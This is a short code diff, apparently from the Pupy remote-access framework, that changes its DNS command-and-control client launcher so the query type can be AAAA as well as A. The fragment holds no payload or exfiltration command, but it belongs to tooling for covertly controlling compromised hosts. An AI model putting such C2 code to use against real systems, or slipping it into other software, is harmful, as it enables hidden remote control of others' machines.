@@ -33,7 +33,7 @@ logger = getLogger('dnscnc')
 
 
 class DNSCommandClientLauncher(DnsCommandsClient):
-    def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
+    def __init__(self, domain, ns=None, qtype=None, ns_timeout=3):
         self.stream = None
         self.commands = []
         self.lock = Lock()
@@ -46,7 +46,9 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             credentials = Credentials()
             key = credentials['DNSCNC_PUB_KEY_V2']
 
-        DnsCommandsClient.__init__(self, domain, key, ns, qtype, ns_timeout=ns_timeout)
+        DnsCommandsClient.__init__(
+            self, domain, key, ns, qtype, ns_timeout=ns_timeout
+        )
 
     def on_session_established(self):
         import pupy
@@ -242,8 +244,8 @@ class DNSCncLauncher(BaseLauncher):
 
         cls.arg_parser.add_argument(
             '--qtype',
-            choices=['A'], default='A',
-            help='DNS query type (For now only A supported)'
+            choices=['A', 'AAAA'], default=None,
+            help='DNS query type (For now only A and AAAA are supported)'
         )
 
 
